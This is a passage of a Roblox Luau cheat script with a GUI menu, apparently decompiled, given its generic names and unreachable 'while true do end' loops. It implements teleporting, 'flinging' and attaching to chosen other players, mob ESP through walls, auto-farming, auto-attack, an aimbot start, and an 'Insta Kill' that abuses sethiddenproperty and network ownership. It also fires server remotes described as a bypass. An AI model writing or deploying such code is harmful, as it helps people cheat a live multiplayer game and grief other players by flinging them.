						line2.From = Vector2.new(currentCamera.ViewportSize.X / 2, currentCamera.ViewportSize.Y / 2 - 6)
						line2.To = Vector2.new(currentCamera.ViewportSize.X / 2, currentCamera.ViewportSize.Y / 2 + 6)
						line2.Color = Color3.new(1, 1, 1)
						line2.Thickness = 1
						line2.Visible = true
						getgenv()._CHCrosshair = { square, line, line2 }
					end
				else
					if not getgenv()._CHCrosshair then
						return
					end



					for _, v36 in ipairs(getgenv()._CHCrosshair) do
						pcall(function()
							v36:Remove()
						end)
					end

					getgenv()._CHCrosshair = nil
				end
			end,
		})

		fn15(function()
			if connection20 then
				connection20:Disconnect()
				connection20 = nil
			end

			if connection18 then
				connection18:Disconnect()
			end

			if connection15 then


				connection15:Disconnect()
				Lighting.FogStart = 0
				Lighting.FogEnd = 100000
			end

			for _, connection22 in ipairs(connections2) do
				pcall(function()
					connection22:Disconnect()
				end)
			end

			if connection16 then
				connection16:Disconnect()
			end

			for _, connection22 in ipairs(connections3) do
				pcall(function()
					connection22:Disconnect()
				end)
			end

			if connection17 then
				connection17:Disconnect()
				Lighting.GlobalShadows = true
				Lighting.Brightness = 1
			end

			if connection14 then
				connection14:Disconnect()
			end

			if connection21 then
				connection21:Disconnect()
			end

			if circle then
				pcall(function()
					circle:Remove()
				end)
			end

			if circle2 then
				pcall(function()
					circle2:Remove()
				end)
			end

			if connection19 then
				connection19:Disconnect()
			end

			UserInputService.MouseIconEnabled = true

			for _, connection22 in ipairs(connections4) do
				pcall(function()
					connection22:Disconnect()
				end)
			end

			pcall(function()
				local character = getCharacter()

				if character then
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						humanoidRootPart.Anchored = false
					end
				end
			end)

			currentCamera.FieldOfView = 70
			currentCamera.CameraType = Enum.CameraType.Custom
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		end)
	end

	fn28()

	tbl6.AntiLag = v34:AddToggle("AntiLag", {
		Text = "Anti-Lag",
		Description = "Boost FPS",
		Default = false,
		Callback = function(enabled2)
			pcall(function()
				setfpscap(enabled2 and 0 or 60)
			end)

			if enabled2 then
				Lighting.GlobalShadows = false
				Lighting.Brightness = 2

				for _, descendant in ipairs(workspace:GetDescendants()) do
					if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Smoke") or descendant:IsA("Fire") then
						pcall(function()
							descendant.Enabled = false
						end)
					end
				end
			else
				Lighting.GlobalShadows = true
			end
		end,
	})

	tbl7.AntiLagFPSCap = v34:AddSlider("AntiLagFPSCap", {
		Text = "FPS Cap",
		Default = 0,
		Min = 0,
		Max = 360,
		Rounding = 0,
		Callback = function(fpsCap)
			pcall(function()
				setfpscap(fpsCap == 0 and math.huge or fpsCap)
			end)
		end,
	})

	v34:AddButton({
		Text = "Boost FPS",
		Func = function()
			pcall(function()
				for _, descendant in ipairs(game:GetDescendants()) do
					if descendant:IsA("ParticleEmitter") or descendant:IsA("Smoke") or descendant:IsA("Fire") or descendant:IsA("Sparkles") then
						descendant.Enabled = false
					end

					if descendant:IsA("BloomEffect") or descendant:IsA("BlurEffect") or descendant:IsA("DepthOfFieldEffect") or descendant:IsA("SunRaysEffect") then
						descendant.Enabled = false
					end
				end

				Lighting.GlobalShadows = false
				Lighting.Brightness = 5
			end)
		end,
	})

	Tools:AddButton({
		Text = "Copy Coordinates",
		Func = function()
			local child = getChild()
			if not child then
				return
			end
			local position = child.Position
			setclipboard(string.format("%.2f, %.2f, %.2f", position.X, position.Y, position.Z))
		end,
	})

	connection8 = nil
	local userIds = {}
	local now3 = 0

	tbl6.NearbyNotifier = Tools:AddToggle("NearbyNotifier", {
		Text = "Nearby Alert",
		Description = "Alert when players are near",
		Default = false,
		Callback = function(nearbyAlert)
			do
				if connection8 then


					connection8:Disconnect()
					connection8 = nil
				end

				userIds = {}
				if not nearbyAlert then
					return
				end

				connection8 = service.Heartbeat:Connect(function()
					local now2 = tick()
					if now2 - now3 < 0.5 then
						return
					end
					now3 = now2
					local child = getChild()
					if not child then
						return
					end
					local n9 = lib.Options.NearbyDist and lib.Options.NearbyDist.Value or 500

					for _, player in ipairs(Players:GetPlayers()) do
						if not (player ~= localPlayer and player.Character) then
							continue
						end
						local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
						if not humanoidRootPart then
							continue
						end
						local magnitude = (child.Position - humanoidRootPart.Position).Magnitude
						local userId = player.UserId

						if magnitude <= n9 and not userIds[userId] then
							userIds[userId] = true
							fn16(player.Name .. " is nearby [" .. math.floor(magnitude) .. "m]", 6)
						elseif magnitude > n9 and userIds[userId] then
							userIds[userId] = nil
							fn16(player.Name .. " left range", 3)
						end
					end
				end)

				return
			end

			while true do
			end
		end,
	})

	tbl7.NearbyDist = Tools:AddSlider("NearbyDist", {
		Text = "Alert Range",
		Default = 500,
		Min = 0,
		Max = 10000,
		Rounding = 0,
		Callback = function()
		end,
	})

	local connection14 = nil
	local now4 = 0

	tbl6.KickNearby = Tools:AddToggle("KickNearby", {
		Text = "Kick Nearby",
		Description = "Auto leave if a player gets close",
		Default = false,
		Callback = function(kickNearby)
			if connection14 then
				connection14:Disconnect()
				connection14 = nil
			end

			if not kickNearby then
				return
			end

			connection14 = service.Heartbeat:Connect(function()
				local now2 = tick()
				if now2 - now4 < 0.3 then
					return
				end
				now4 = now2
				local child = getChild()
				if not child then
					return
				end
				local distance = lib.Options.KickNearbyDist and lib.Options.KickNearbyDist.Value or 50

				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= localPlayer and player.Character then
						local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart and (child.Position - humanoidRootPart.Position).Magnitude <= distance then
							fn16(player.Name .. " got too close — leaving server", 3)
							task.wait(0.5)

							pcall(function()
								game:GetService("TeleportService"):Teleport(game.PlaceId)
							end)

							return
						end
					end
				end
			end)
		end,
	})

	tbl7.KickNearbyDist = Tools:AddSlider("KickNearbyDist", {
		Text = "Kick Range",
		Default = 50,
		Min = 5,
		Max = 500,
		Rounding = 0,
		Callback = function()
		end,
	})

	tbl7.Coordinates = Teleport:AddInput("Coordinates", {
		Default = "",
		Placeholder = "X, Y, Z",
		Callback = function()
		end,
	})

	Teleport:AddButton({
		Text = "Teleport",
		Func = function()
			local match, v36, v37 = (lib.Options.Coordinates and lib.Options.Coordinates.Value or ""):match("([%-%d%.]+)%s*,%s*([%-%d%.]+)%s*,%s*([%-%d%.]+)")

			if match then
				fn18(CFrame.new(tonumber(match), tonumber(v36), tonumber(v37)))
			end
		end,
	})

	Teleport:AddButton({
		Text = "Copy Position",
		Func = function()
			do
				local child = getChild()

				if child then
					setclipboard(tostring(child.Position))
				end

				return
			end

			while true do
			end
		end,
	})

	connection9 = nil

	tbl6.ClickTP = Teleport:AddToggle("ClickTP", {
		Text = "Click TP",
		Description = "Right-click to teleport",
		Default = false,
		Callback = function(clickTp)
			if connection9 then
				connection9:Disconnect()
				connection9 = nil
			end

			if clickTp then
				connection9 = UserInputService.InputBegan:Connect(function(input, gameProcessed)
					if gameProcessed or input.UserInputType ~= Enum.UserInputType.MouseButton2 then
						return
					end
					local v36 = currentCamera:ScreenPointToRay(input.Position.X, input.Position.Y)
					local hit = workspace:Raycast(v36.Origin, v36.Direction * 2000)

					if hit then
						fn18(CFrame.new(hit.Position + Vector3.new(0, 3, 0)))
					end
				end)
			end
		end,
	})

	local function fn29()
		local function getNames()
			local names = { "--" }

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					table.insert(names, player.Name)
				end
			end

			return names
		end

		tbl7.AttachTargetPlayer = Attach:AddDropdown("AttachTargetPlayer", {
			Text = "Attach Target",
			Description = "Pick a player",
			Values = getNames(),
			Default = nil,
			Multi = false,
			Callback = function()
			end,
		})

		Attach:AddButton({
			Text = "Refresh Players",
			Func = function()
				tbl7.AttachTargetPlayer:SetValues(getNames())
			end,
		})
	end

	fn29()

	tbl6.AttachSelected = Attach:AddToggle("AttachSelected", {
		Text = "Attach Player",
		Description = "Stick to a player",
		Default = false,
		Callback = function(attachPlayer)
			if not attachPlayer then
				return
			end

			task.spawn(function()
				while tbl6.AttachSelected and fn17("AttachSelected") do
					if not getChild() then
						task.wait()
						continue
					end
					local value2 = lib.Options.AttachTargetPlayer and lib.Options.AttachTargetPlayer.Value
					local child = type(value2) == "string" and Players:FindFirstChild(value2) or value2

					if child and child ~= localPlayer and child.Character then
						local humanoidRootPart = child.Character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart then
							fn18(humanoidRootPart.CFrame * CFrame.new(0, lib.Options.MobsHeight and lib.Options.MobsHeight.Value or 0, lib.Options.MobsDistance and lib.Options.MobsDistance.Value or 0))
						end
					end

					task.wait()
				end
			end)
		end,
	})

	tbl7.MobsRange = v35:AddSlider("MobsRange", {
		Text = "Range",
		Default = 1000,
		Min = 0,
		Max = 10000,
		Rounding = 0,
		Callback = function()
		end,
	})

	tbl7.MobsDistance = v35:AddSlider("MobsDistance", {
		Text = "Distance",
		Default = 0,
		Min = -50,
		Max = 50,
		Rounding = 0,
		Callback = function()
		end,
	})

	tbl7.MobsHeight = v35:AddSlider("MobsHeight", {
		Text = "Height",
		Default = 0,
		Min = -50,
		Max = 50,
		Rounding = 0,
		Callback = function()
		end,
	})

	local flag11 = false
	local connections2 = {}
	local flingTarget2 = nil
	local connection15 = nil

	local function getNames()
		local names = { "--" }

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				table.insert(names, player.Name)
			end
		end

		return names
	end

	local function fn30()
		flag11 = false

		if connection15 then
			pcall(function()
				connection15:Disconnect()
			end)

			connection15 = nil
		end

		for _, connection16 in ipairs(connections2) do
			pcall(function()
				connection16:Disconnect()
			end)
		end

		connections2 = {}
		local character = getCharacter()
		if not character then
			return
		end

		for _, descendant in ipairs(character:GetDescendants()) do
			if descendant:IsA("BasePart") then
				pcall(function()
					descendant.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
					descendant.Massless = false
					descendant.Velocity = Vector3.zero
				end)
			elseif descendant:IsA("BodyAngularVelocity") then
				pcall(function()
					descendant:Destroy()
				end)
			end
		end
	end

	tbl7.FlingTarget = v35:AddDropdown("FlingTarget", {
		Text = "Fling Target",
		Description = "Pick a target",
		Values = getNames(),
		Default = nil,
		Multi = false,
		Callback = function(flingTarget)
			do
				flingTarget2 = flingTarget
				return
			end

			while true do
			end
		end,
	})

	v35:AddButton({
		Text = "Refresh Players",
		Func = function()
			tbl7.FlingTarget:SetValues(getNames())
		end,
	})

	tbl6.FlingPlayer = v35:AddToggle("FlingPlayer", {
		Text = "Fling Player",
		Description = "Launch a player",
		Default = false,
		Callback = function(flingPlayer)
			fn30()
			if not flingPlayer then
				return
			end
			local flingTarget = type(flingTarget2) == "string" and flingTarget2 or ""

			if flingTarget == "--" or flingTarget == "" then
				fn16("Pick a target first", 3)
				fn21("FlingPlayer", false)
				return
			end

			local child = Players:FindFirstChild(flingTarget)

			if not child or child == localPlayer then
				fn16("Invalid target", 3)
				fn21("FlingPlayer", false)
				return
			end

			flag11 = true
			local character2 = getCharacter()
			if not character2 then
				fn21("FlingPlayer", false)
				return
			end

			if not character2:FindFirstChild("HumanoidRootPart") then
				fn21("FlingPlayer", false)
				return
			end

			for _, descendant in ipairs(character2:GetDescendants()) do
				if descendant:IsA("BasePart") then
					pcall(function()
						descendant.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
						descendant.Massless = true
					end)

					if not descendant:FindFirstChildOfClass("BodyAngularVelocity") then
						local bodyAngularVelocity = Instance.new("BodyAngularVelocity", descendant)
						bodyAngularVelocity.AngularVelocity = Vector3.new(0, 9999, 0)
						bodyAngularVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
						bodyAngularVelocity.P = math.huge
					end
				end
			end

			local connection16 = service.Stepped:Connect(function()
				local character = getCharacter()
				if not character then
					return
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						pcall(function()
							descendant.CanCollide = false
						end)
					end
				end
			end)

			table.insert(connections2, connection16)

			local connection17 = service.Heartbeat:Connect(function()
				if not flag11 then
					do
						return
					end

					while true do
					end
				end

				local character = getCharacter()
				if not character then
					return
				end
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local child2 = Players:FindFirstChild(flingTarget)
				if not child2 or not child2.Character then
					return
				end
				local humanoidRootPart2 = child2.Character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart2 then
					return
				end
				humanoidRootPart.CFrame = humanoidRootPart2.CFrame
			end)

			table.insert(connections2, connection17)

			connection15 = localPlayer.CharacterAdded:Connect(function(character)
				task.wait(0.5)
				if not flag11 then
					return
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						pcall(function()
							descendant.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
							descendant.Massless = true
						end)

						if not descendant:FindFirstChildOfClass("BodyAngularVelocity") then
							local bodyAngularVelocity = Instance.new("BodyAngularVelocity", descendant)
							bodyAngularVelocity.AngularVelocity = Vector3.new(0, 9999, 0)
							bodyAngularVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
							bodyAngularVelocity.P = math.huge
						end
					end
				end
			end)
		end,
	})

	fn15(function()
		fn30()
	end)

	local connection16 = nil

	tbl6.AntiFling = v35:AddToggle("AntiFling", {
		Text = "Anti Fling",
		Description = "Block fling attacks",
		Default = false,
		Callback = function(antiFling)
			if connection16 then
				connection16:Disconnect()
				connection16 = nil
			end

			if not antiFling then
				return
			end

			connection16 = service.Stepped:Connect(function()
				for _, player in ipairs(Players:GetPlayers()) do
					if not (player ~= localPlayer and player.Character) then
						continue
					end

					for _, descendant in ipairs(player.Character:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.CanCollide = false
							end)
						end
					end
				end
			end)
		end,
	})

	fn15(function()
		if connection16 then
			connection16:Disconnect()
			connection16 = nil
		end
	end)
end

do
	local v23 = tbl8.MobFarm:AddGroupbox("Mob Farm")
	local Config = tbl8.MobFarm:AddGroupbox("Config")
	local monsters = workspace:FindFirstChild("Monsters")
	local connection10 = nil
	local farmMobs2 = false
	local now2 = 0

	getgenv()._chFireBypass = function()
		if tick() - now2 < 3 then
			return
		end
		now2 = tick()

		pcall(function()
			game:GetService("ReplicatedStorage").Remotes.OpenCharacterCustomization:FireServer("Close")
			game:GetService("ReplicatedStorage").Remotes.CustomizationRestoreAck:FireServer(11)
		end)
	end

	local farmPosition2 = "Behind"
	local xOffset2 = 0
	local yOffset2 = 22
	local distance2 = 9
	local tbl9 = {}
	local tbl10 = { ["Training Dummy"] = true, Runner = true }

	local function getHumanoidRootPart(model)
		local humanoidRootPart = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart or model:FindFirstChild("Torso") or model:FindFirstChild("Head")
		local humanoidRootPart2

		if humanoidRootPart then
			humanoidRootPart2 = humanoidRootPart
		else
			local function getChild2()
				for _, child in ipairs(model:GetChildren()) do
					if child:IsA("BasePart") then
						return child
					end
				end
			end

			humanoidRootPart2 = getChild2()
		end

		return humanoidRootPart2
	end

	local function fn20(child)
		return child.Name:gsub("%s*%d+$", "")
	end

	local function fn21()
		local tbl11 = { "Nearest Mob" }
		local tbl12 = {}
		local v24 = ipairs
		local children = monsters and monsters:GetChildren() or {}

		for _, child in v24(children) do
			if not child:IsA("Model") then
				continue
			end
			local v25 = fn20(child)
			if tbl10[v25] then
				continue
			end
			local humanoid = child:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.Health > 0 then
				if not tbl12[v25] then
					table.insert(tbl11, v25)
					tbl12[v25] = true
				end
			end
		end

		table.sort(tbl11, function(arg, arg2)
			if arg == "Nearest Mob" then
				return true
			end

			if arg2 == "Nearest Mob" then
				return false
			end
			return arg < arg2
		end)

		return tbl11
	end

	local function getChild2()
		local child = getChild()
		if not child then
			return
		end
		local magnitude2 = math.huge
		local nearestMob = not next(tbl9) or tbl9["Nearest Mob"]
		local v24 = ipairs
		local children = monsters and monsters:GetChildren() or {}
		local child3 = nil

		for _, child2 in v24(children) do
			if not child2:IsA("Model") then
				continue
			end
			local v25 = fn20(child2)
			if tbl10[v25] then
				continue
			end

			if not nearestMob then
				if not tbl9[v25] then
					continue
				end
			end

			local humanoidRootPart = getHumanoidRootPart(child2)
			local humanoid = child2:FindFirstChildOfClass("Humanoid")

			if humanoidRootPart and humanoid and humanoid.Health > 0 then
				local magnitude = (humanoidRootPart.Position - child.Position).Magnitude

				if magnitude < magnitude2 then
					magnitude2 = magnitude
					child3 = child2
				end
			end
		end

		return child3
	end

	workspace:FindFirstChild("EnemySpawnZones")

	local function getVector(humanoidRootPart)
		local position = humanoidRootPart.Position
		local vector

		if farmPosition2 == "Above" then
			vector = Vector3.new(position.X, position.Y + distance2, position.Z)
		elseif farmPosition2 == "Below" then
			vector = Vector3.new(position.X, position.Y - distance2, position.Z)
		elseif farmPosition2 == "In Front" then
			vector = position + humanoidRootPart.CFrame.LookVector * distance2
		elseif farmPosition2 == "Behind" then
			vector = position - humanoidRootPart.CFrame.LookVector * distance2
		else
			vector = Vector3.new(position.X, position.Y - distance2, position.Z)
		end

		return vector + Vector3.new(xOffset2, yOffset2, 0)
	end

	local function fn22(targetMob)
		local tbl11 = {}

		for k, v24 in pairs(targetMob) do
			if type(k) == "string" and v24 == true then
				tbl11[k] = true
			elseif type(v24) == "string" then
				tbl11[v24] = true
			end
		end

		return tbl11
	end

	tbl7.MobSelect = v23:AddDropdown("MobSelect", {
		Text = "Target Mob",
		Description = "Pick mob types",
		Values = fn21(),
		Default = { "Nearest Mob" },
		Multi = true,
		Callback = function(targetMob)
			tbl9 = fn22(targetMob)
		end,
	})

	v23:AddButton({
		Text = "Refresh Mobs",
		Func = function()
			pcall(function()
				lib.Options.MobSelect:SetValues(fn21())
			end)
		end,
	})

	tbl6.FarmMobs = v23:AddToggle("FarmMobs", {
		Text = "Farm Mobs",
		Description = "Auto farm mobs",
		Default = false,
		Callback = function(farmMobs)
			farmMobs2 = farmMobs

			if connection10 then
				connection10:Disconnect()
				connection10 = nil
			end

			if not farmMobs then
				return
			end
			local child = nil

			connection10 = service.Heartbeat:Connect(function()
				if not farmMobs2 then
					return
				end
				local character = getCharacter()
				if not character then
					child = nil
					return
				end
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if not humanoid or humanoid.Health <= 0 then
					child = nil
					return
				end
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					child = nil
					return
				end

				if child then
					if not child.Parent then
						child = nil
					else
						local child2 = child:FindFirstChildOfClass("Humanoid")

						if not child2 or child2.Health <= 0 then
							child = nil
						end
					end
				end

				if not child then
					child = getChild2()
				end

				if not child then
					return
				end
				local humanoidRootPart2 = getHumanoidRootPart(child)
				if not humanoidRootPart2 then
					child = nil
					return
				end
				humanoidRootPart.CFrame = CFrame.lookAt(getVector(humanoidRootPart2), humanoidRootPart2.Position)
				humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
				humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
			end)
		end,
	})

	Config:AddDropdown("MobFarmMode", {
		Text = "Farm Position",
		Description = "Position relative to mob",
		Values = { "Above", "Below", "In Front", "Behind" },
		Default = "Behind",
		Multi = false,
		Callback = function(farmPosition)
			farmPosition2 = farmPosition
		end,
	})

	Config:AddSlider("MobFarmOffX", {
		Text = "X Offset",
		Default = 0,
		Min = -50,
		Max = 50,
		Rounding = 1,
		Callback = function(xOffset)
			xOffset2 = xOffset
		end,
	})

	Config:AddSlider("MobFarmOffY", {
		Text = "Y Offset",
		Default = 22,
		Min = -50,
		Max = 50,
		Rounding = 1,
		Callback = function(yOffset)
			yOffset2 = yOffset
		end,
	})

	Config:AddSlider("MobFarmDist", {
		Text = "Distance",
		Description = "Distance from mob",
		Default = 9,
		Min = 0,
		Max = 50,
		Rounding = 1,
		Callback = function(distance)
			distance2 = distance
		end,
	})

	Config:AddSlider("TweenSpeed", {
		Text = "Tween Speed",
		Default = 30,
		Min = 5,
		Max = 5000,
		Rounding = 0,
		Callback = function(tweenSpeed)
			tweenSpeed2 = tweenSpeed
		end,
	})

	fn15(function()
		farmMobs2 = false

		if connection10 then
			connection10:Disconnect()
			connection10 = nil
		end
	end)
end

local v23 = tbl8.InstaKill:AddGroupbox("Insta Kill")
local connection10 = nil
local range2 = 100
local n9 = 0
local monsters = workspace:FindFirstChild("Monsters")

local function getHumanoidRootPart(model)
	local humanoidRootPart = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart or model:FindFirstChild("Torso") or model:FindFirstChild("Head")
	local humanoidRootPart2

	if humanoidRootPart then
		humanoidRootPart2 = humanoidRootPart
	else
		local function getChild2()
			for _, child in ipairs(model:GetChildren()) do
				if child:IsA("BasePart") then
					return child
				end
			end
		end

		humanoidRootPart2 = getChild2()
	end

	return humanoidRootPart2
end

local function fn20()
	if connection10 then
		connection10:Disconnect()
	end

	connection10 = service.Heartbeat:Connect(function()
		local character = getCharacter()
		if not character then
			return
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoid or humanoid.Health <= 0 then
			return
		end

		pcall(function()
			sethiddenproperty(localPlayer, "MaxSimulationRadius", math.huge)
			sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
		end)

		local child = getChild()
		if not child then
			return
		end
		local fallenPartsDestroyHeight = workspace.FallenPartsDestroyHeight

		if not monsters then
			monsters = workspace:FindFirstChild("Monsters")
		end

		local v24 = ipairs
		local children = monsters and monsters:GetChildren() or {}

		for _, child2 in v24(children) do
			if not child2:IsA("Model") then
				continue
			end
			local humanoidRootPart = getHumanoidRootPart(child2)
			if not humanoidRootPart then
				continue
			end
			local humanoid2 = child2:FindFirstChildOfClass("Humanoid")
			if not (humanoid2 and not (humanoid2.Health <= 0)) then
				continue
			end

			if humanoidRootPart.Position.Y <= fallenPartsDestroyHeight then
				continue
			end

			if not (n9 > 0 and humanoid2.Health / humanoid2.MaxHealth * 100 > n9) then
				if not (range2 < (humanoidRootPart.Position - child.Position).Magnitude) then
					pcall(function()
						humanoid2.Health = 0
					end)

					pcall(function()
						child2:PivotTo(CFrame.new(humanoidRootPart.Position.X, fallenPartsDestroyHeight - 100, humanoidRootPart.Position.Z))
					end)

					pcall(function()
						child2:BreakJoints()
					end)

					pcall(function()
						for _, descendant in ipairs(child2:GetDescendants()) do
							if descendant:IsA("BasePart") then
								descendant.Velocity = Vector3.new(0, -5000, 0)
								descendant.CFrame = CFrame.new(humanoidRootPart.Position.X, fallenPartsDestroyHeight - 100, humanoidRootPart.Position.Z)
							end
						end
					end)
				end
			end
		end
	end)
end

local function fn21()
	if connection10 then
		connection10:Disconnect()
		connection10 = nil
	end
end

tbl6.InstaKillEnabled = v23:AddToggle("InstaKillEnabled", {
	Text = "Insta Kill",
	Description = "Doesn't work on all mobs, some work better than others",
	Default = false,
	Callback = function(instaKill)
		if instaKill then
			fn20()
		else
			fn21()
		end
	end,
})

v23:AddSlider("IKHealthThreshold", {
	Text = "HP Threshold %",
	Description = "Max HP % to kill (0 = any)",
	Default = 0,
	Min = 0,
	Max = 100,
	Rounding = 0,
	Callback = function(value)
		n9 = value
	end,
})

v23:AddSlider("IKRange", {
	Text = "Range",
	Description = "Kill range",
	Default = 100,
	Min = 10,
	Max = 10000,
	Rounding = 0,
	Callback = function(range)
		range2 = range
	end,
})

v23:AddDivider()
v23:AddLabel("Requires network ownership to work")

fn15(function()
	fn21()
end)

local v24 = tbl8.ESP:AddGroupbox("Mob ESP")
local monsters2 = workspace:FindFirstChild("Monsters")
local tbl9 = {}
local connections = {}
local mobEsp2 = false

local function fn22(instance)
	if not instance or not instance:IsA("Model") then
		return
	end

	if not instance:FindFirstChild("HumanoidRootPart") and not instance:FindFirstChild("Torso") and not instance:FindFirstChild("Head") then
		return
	end

	if not instance:FindFirstChildOfClass("Humanoid") then
		return
	end

	if tbl9[instance] then
		return
	end
	tbl9[instance] = true
	chEspLib:AddModelTarget(instance, instance.Name, getgenv()._CH_MobESPColor)
end

local function fn23(child)
	if tbl9[child] then
		tbl9[child] = nil
		chEspLib:RemoveModelTarget(child)
	end
end

local function fn24()
	for k in pairs(tbl9) do
		chEspLib:RemoveModelTarget(k)
	end

	table.clear(tbl9)
end

tbl7.MobESPColor = v24:AddColorPicker("MobESPColor", {
	Default = Color3.fromRGB(255, 0, 0),
	Callback = function(color)
		getgenv()._CH_MobESPColor = color



		for _, v25 in pairs(chEspLib.Cache) do
			if v25.ModelKey and not v25._isNpc then
				v25["CustomGradTop"] = color
				v25.CustomGradBot = color
				v25.LastGradTop = nil
				v25.LastGradBot = nil
				v25["LastGlowTop"] = nil
				v25.LastGlowBot = nil
				v25["LastFillTop"] = nil
				v25["LastFillBot"] = nil
			end
		end
	end,
})

tbl6.MobESP = v24:AddToggle("MobESP", {
	Text = "Mob ESP",
	Description = "See mobs through walls",
	Default = false,
	Callback = function(mobEsp)
		mobEsp2 = mobEsp

		if mobEsp then
			local v25 = ipairs
			local children = monsters2 and monsters2:GetChildren() or {}

			for _, child in v25(children) do
				if child:IsA("Model") then
					fn22(child)
				end
			end

			local connection11 = monsters2 and monsters2.ChildAdded:Connect(function(child)
				task.wait(0.5)

				if child:IsA("Model") and mobEsp2 then
					fn22(child)
				end
			end)

			local connection12 = monsters2 and monsters2.ChildRemoved:Connect(function(child)
				if child:IsA("Model") then
					fn23(child)
				end
			end)

			if connection11 then
				table.insert(connections, connection11)
			end

			if connection12 then
				table.insert(connections, connection12)
			end
		else
			fn24()

			for _, connection11 in ipairs(connections) do
				pcall(function()
					connection11:Disconnect()
				end)
			end

			connections = {}
		end
	end,
})

fn15(function()
	mobEsp2 = false
	fn24()

	for _, connection11 in ipairs(connections) do
		pcall(function()
			connection11:Disconnect()
		end)
	end

	do
		connections = {}
		return
	end

	while true do
	end
end)

do
	local v25 = tbl8.Combat:AddGroupbox("Auto M1")
	local v26 = tbl8.Combat:AddGroupbox("Auto M2")
	local Weapon = tbl8.Combat:AddGroupbox("Weapon")
	local rAbilityEvent = game:GetService("ReplicatedStorage").Remotes.RAbilityEvent
	local VirtualInputManager = game:GetService("VirtualInputManager")
	local connection11 = nil
	local connection12 = nil
	local weapon2 = "Sword"

	local function getNames()
		local names = {}
		local tbl10 = {}
		local backpack = localPlayer:FindFirstChild("Backpack")

		if backpack then
			for _, child in ipairs(backpack:GetChildren()) do
				if child:IsA("Tool") and not tbl10[child.Name] then
					tbl10[child.Name] = true
					table.insert(names, child.Name)
				end
			end
		end

		local character = localPlayer.Character

		if character then
			local tool = character:FindFirstChildOfClass("Tool")

			if tool and not tbl10[tool.Name] then
				tbl10[tool.Name] = true
				table.insert(names, tool.Name)
			end
		end

		table.sort(names)
		return names
	end

	Weapon:AddDropdown("EquipWeapon", {
		Text = "Weapon",
		Values = getNames(),
		Default = "Sword",
		Multi = false,
		Callback = function(weapon)
			weapon2 = weapon
		end,
	})

	Weapon:AddButton({
		Text = "Refresh Weapons",
		Func = function()
			pcall(function()
				lib.Options.EquipWeapon:SetValues(getNames())
			end)
		end,
	})

	local function fn25()
		local character = getCharacter()
		if not character then
			return
		end

		if character:FindFirstChild(weapon2) then
			return
		end
		local backpack = localPlayer:FindFirstChild("Backpack")
		if not backpack then
			return
		end
		local child = backpack:FindFirstChild(weapon2)
		if not child then
			return
		end
		local child2 = character:FindFirstChildOfClass("Humanoid")
		if not child2 then
			return
		end
		child2:EquipTool(child)
	end

	tbl6.AutoEquip = Weapon:AddToggle("AutoEquip", {
		Text = "Auto Equip",
		Description = "Always keep weapon out",
		Default = false,
		Callback = function(autoEquip)
			if connection11 then
				connection11:Disconnect()
				connection11 = nil
			end

			if connection12 then
				connection12:Disconnect()
				connection12 = nil
			end

			if not autoEquip then
				return
			end
			fn25()

			connection11 = service.Heartbeat:Connect(function()
				if not fn17("AutoEquip") then
					return
				end
				fn25()
			end)

			connection12 = localPlayer.CharacterAdded:Connect(function()
				task.wait(1)

				if fn17("AutoEquip") then
					fn25()
				end
			end)
		end,
	})

	local autoM12 = false

	tbl6.AutoM1 = v25:AddToggle("AutoM1", {
		Text = "Auto M1",
		Description = "Auto light attack",
		Default = false,
		Callback = function(autoM1)
			autoM12 = autoM1
			if not autoM1 then
				return
			end

			task.spawn(function()
				while autoM12 and fn17("AutoM1") do
					pcall(function()
						VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
						task.wait(0.03)
						VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
					end)

					task.wait(0.15)
				end
			end)
		end,
	})

	local autoM22 = false

	tbl6.AutoM2 = v26:AddToggle("AutoM2", {
		Text = "Auto M2",
		Description = "Auto heavy attack",
		Default = false,
		Callback = function(autoM2)
			autoM22 = autoM2
			if not autoM2 then
				return
			end

			task.spawn(function()
				while autoM22 and fn17("AutoM2") do
					local character = getCharacter()
					local sword = character and character:FindFirstChild("Sword")

					if sword then
						local child = getChild()

						if child then
							pcall(function()
								rAbilityEvent:FireServer(sword, child.CFrame)
							end)
						end
					end

					task.wait(0.15)
				end
			end)
		end,
	})

	local Shadowbeam = tbl8.Combat:AddGroupbox("Shadowbeam")
	local AimCFrame = nil

	pcall(function()
		AimCFrame = require(game:GetService("ReplicatedStorage").Assets.Scripts.AimCFrame)
	end)

	local get = AimCFrame and AimCFrame.Get
	local shadowbeamAimbot2 = false
	local autoShadowBeamAimbot2 = false
	local connection13 = nil
	local consumableEvent = game:GetService("ReplicatedStorage").Remotes:FindFirstChild("ConsumableEvent")

	local function fn26()
